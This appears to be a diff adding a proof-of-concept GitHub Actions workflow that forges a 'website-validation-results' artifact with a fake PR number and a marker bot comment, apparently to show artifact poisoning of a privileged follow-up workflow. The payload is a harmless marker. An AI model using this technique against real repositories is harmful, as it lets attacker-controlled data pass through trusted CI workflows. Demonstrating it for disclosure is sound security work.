@@ -1,0 +1,24 @@
+name: Website validation
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge results
+        run: |
+          mkdir -p out
+          echo "1" > out/pr
+          printf 'POC_LINKCHECK_BOT_COMMENT — posted by the bot from attacker-forged artifact.\n' > out/linkcheck
+      - name: Upload results
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: website-validation-results
+          path: out/*
+          retention-days: 1
